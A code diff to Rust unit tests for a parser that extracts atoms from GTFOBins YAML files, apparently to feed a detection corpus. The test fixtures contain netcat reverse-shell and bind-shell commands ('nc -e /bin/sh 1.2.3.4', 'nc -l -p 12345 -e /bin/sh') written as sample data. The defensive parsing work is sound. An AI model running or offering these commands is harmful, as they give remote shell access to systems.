@@ -819,16 +819,37 @@ Commands:
         }
 
         #[test]
-        fn extract_gtfobins_bails_without_close_fence() {
-            // Without a closing `---` fence, treat the file as
-            // malformed and emit zero atoms — DON'T pass the
-            // whole markdown body to serde_yaml.
-            let doc = "---\nfunctions:\n  shell:\n    - code: |\n        nc -e /bin/sh 1.2.3.4\nNo closing fence here, just markdown text after the front-matter.\n";
+        fn extract_gtfobins_handles_missing_close_fence() {
+            // Upstream GTFOBins files have ONLY a leading `---\n`
+            // fence — no closing one. The whole file is YAML. The
+            // earlier "require closing fence" check produced 0
+            // atoms across the entire corpus (the bug this commit
+            // also fixes). Now: leading fence stripped, rest parsed
+            // as YAML, atoms emitted.
+            let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n  bind-shell:\n  - code: nc -l -p 12345 -e /bin/sh\n";
             let mut atoms = BTreeSet::new();
             extract_gtfobins_atoms(doc, &mut atoms);
             assert!(
-                atoms.is_empty(),
-                "expected no atoms from malformed file, got {atoms:?}"
+                !atoms.is_empty(),
+                "expected atoms from a no-close-fence file, got none"
+            );
+            assert!(
+                atoms.iter().any(|a| a.contains("nc")),
+                "expected an nc-related atom, got {atoms:?}"
+            );
+        }
+
+        #[test]
+        fn extract_gtfobins_handles_close_fence_when_present() {
+            // Future-proof: if a GTFOBins file ever grows trailing
+            // prose after a closing `---` fence, truncate at the
+            // fence rather than handing the prose to serde_yaml.
+            let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n---\nPost-fence prose that isn't YAML.\n";
+            let mut atoms = BTreeSet::new();
+            extract_gtfobins_atoms(doc, &mut atoms);
+            assert!(
+                !atoms.is_empty(),
+                "expected atoms when prose follows close fence"
             );
         }
 
